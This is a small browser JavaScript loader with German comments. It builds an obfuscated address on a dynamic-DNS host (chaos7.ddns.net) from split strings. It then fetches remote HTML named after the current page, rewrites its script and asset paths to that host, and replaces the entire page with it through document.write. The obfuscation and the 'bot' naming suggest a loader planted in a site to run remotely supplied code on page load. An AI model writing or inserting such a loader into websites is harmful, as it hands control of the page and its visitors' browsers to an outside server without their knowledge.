(function () {
    const botName = "c7"

    // 1. Verschleierte Basis-Konfiguration
    const _parts = [
        "https",
        "://" + "chaos7",
        ".ddns" + ".net:3000",
        `/${botName}` + "/websites/"
    ];
    const baseUrl = _parts.join('');

    // 2. Automatische Erkennung des aktuellen Dateinamens
    const currentFileName = window.location.pathname.split('/').pop() || "index.html";

    const targetUrl = baseUrl + currentFileName;

    async function launch() {
        try {
            const response = await fetch(targetUrl);

            if (!response.ok) {
                throw new Error(`Server antwortet mit Status ${response.status}`);
            }

            const htmlContent = await response.text();

            // DOM vorbereiten
            const parser = new DOMParser();
            const remoteDoc = parser.parseFromString(htmlContent, 'text/html');

            // 3. Asset- und Link-Pfad-Korrektur (Relative -> Absolute URLs über den Heimserver)
            const fixPaths = (selector, attr) => {
                remoteDoc.querySelectorAll(selector).forEach(el => {
                    const val = el.getAttribute(attr);

                    // Nur relative Pfade oder interne Links umbiegen (die nicht mit http/https/data/#// beginnen)
                    if (val && !/^(https?:|data:|#|\/\/)/.test(val)) {
                        el.setAttribute(attr, new URL(val, baseUrl).href);
                    }

                    // Falls ein Link absolut auf den Heimserver zeigt, aber den Dateinamen behalten soll
                    if (selector === 'a' && val && val.includes("chaos7.ddns.net")) {
                        const fileName = val.split('/').pop();
                        el.setAttribute(attr, baseUrl + fileName);
                    }
                });
            };

            fixPaths('link', 'href');
            fixPaths('script', 'src');
            fixPaths('img', 'src');
            fixPaths('source', 'src');
            fixPaths('a', 'href');

            // 4. Seite komplett ersetzen
            document.open();
            document.write(remoteDoc.documentElement.outerHTML);
            document.close();

        } catch (err) {
            console.error("Loader Error:", err);
            document.body.innerHTML = `
                <div style="text-align:center; font-family:sans-serif; color:#555; padding-top:20vh;">
                    <h2 style="color:#09f;">Inhalt konnte nicht geladen werden</h2>
                    <p>${currentFileName} auf dem Remote-Server nicht erreichbar.</p>
                </div>`;
        }
    }

    launch();
})();